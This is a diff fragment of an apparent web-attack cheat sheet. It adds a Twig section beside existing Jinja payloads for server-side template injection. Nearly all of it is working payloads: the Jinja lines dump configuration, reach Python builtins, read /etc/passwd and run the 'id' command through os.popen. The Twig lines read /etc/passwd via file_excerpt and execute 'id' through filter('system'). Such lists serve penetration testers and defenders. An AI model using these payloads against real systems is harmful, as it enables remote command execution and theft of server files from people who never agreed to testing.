@@ -922,11 +922,21 @@ ${{<%[%'"}}%\.
 
 ![image](https://github.com/user-attachments/assets/af2de088-7f4d-4d77-a004-c03ca2d964e6)
 
+- Jinja
+
 ```
 {{ config.items() }}
 {{ self.__init__.__globals__.__builtins__ }}
 {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+- Twig
+
+```
+{{ _self }}
+{{ "/etc/passwd"|file_excerpt(1,-1) }}
+{{ ['id'] | filter('system') }}
 ```
 
 - Server-Side Includes (SSI) Injection
